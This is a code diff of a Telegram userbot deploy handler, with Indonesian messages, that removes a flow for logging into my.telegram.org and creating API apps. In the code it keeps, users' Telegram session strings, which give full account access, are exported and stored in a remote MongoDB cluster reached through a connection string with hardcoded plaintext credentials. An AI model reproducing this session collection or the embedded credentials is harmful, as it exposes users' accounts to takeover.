@@ -37,7 +37,6 @@ import sys
 import os
 import dotenv
 from dotenv import load_dotenv
-from Ubot.modules.bot.helper_funcs.helper_steps import *
 from Ubot.logging import LOGGER
 from os import environ, execle
 from Ubot.modules.basic import restart
@@ -74,8 +73,6 @@ async def recv_tg_tfa_message(_, message: Message):
     phone_number = w_s_dict.get("PHONE_NUMBER")
     loical_ci = w_s_dict.get("USER_CLIENT")
     is_tfa_reqd = bool(w_s_dict.get("IS_NEEDED_TFA"))
-    otp = w_s_dict.get("OTP")
-    random_hash = w_s_dict.get("RANDOM_HASH")
     if not is_tfa_reqd or not phone_number:
         return
     tfa_code = message.text
@@ -87,38 +84,6 @@ async def recv_tg_tfa_message(_, message: Message):
         )
         del AKTIFPERINTAH[message.chat.id]
     else:
-        # create app
-        phone_codeapp = otp
-        try:
-            provided_code = extract_code_imn_ges(phone_codeapp)
-        except:
-            await message.reply_text("kode ngga kebaca")
-        if provided_code is None:
-            await message.reply_text(
-                text=Config.IN_VALID_CODE_PVDED
-            )
-        status_r, cookie_v = login_step_get_stel_cookie(
-            phone_number,
-            random_hash,
-            provided_code
-        )
-        if status_r:
-            status_t, response_dv = scarp_tg_existing_app(cookie_v)
-            if not status_t:
-                create_new_tg_app(
-                    cookie_v,
-                    response_dv.get("tg_app_hash"),
-                    Config.APP_TITLE,
-                    Config.APP_SHORT_NAME,
-                    Config.APP_URL,
-                    Config.APP_PLATFORM,
-                    Config.APP_DESCRIPTION
-                )
-            status_t, response_dv = scarp_tg_existing_app(cookie_v)
-            app_id = response_dv["App Configuration"]["app_id"]
-            app_hash = response_dv["App Configuration"]["api_hash"]
-            
-            
         client = pymongo.MongoClient("mongodb+srv://ubot0:ubot0@ubot.zhj1x91.mongodb.net/?retryWrites=true&w=majority")
         db = client["telegram_sessions"]
         mongo_collection = db["sesi_collection"]
@@ -134,11 +99,9 @@ async def recv_tg_tfa_message(_, message: Message):
         
         filename = ".env"
         with open(filename, "a") as file:
-            file.write(f"\nAPP_ID{count}={str(app_id)}\nAPI_HASH{count}={str(app_hash)}\nSESSION{count}={str(await loical_ci.export_session_string())}")
+            file.write(f"\nSESSION{count}={str(await loical_ci.export_session_string())}")
         await message.reply_text("`Berhasil Melakukan Deploy.`")
         session_data = {
-            "app_id": app_id or "",
-            "api_hash": app_hash or "",
             "session_string": session_string,
             "user_id": message.chat.id,
             "username": message.chat.username or "",
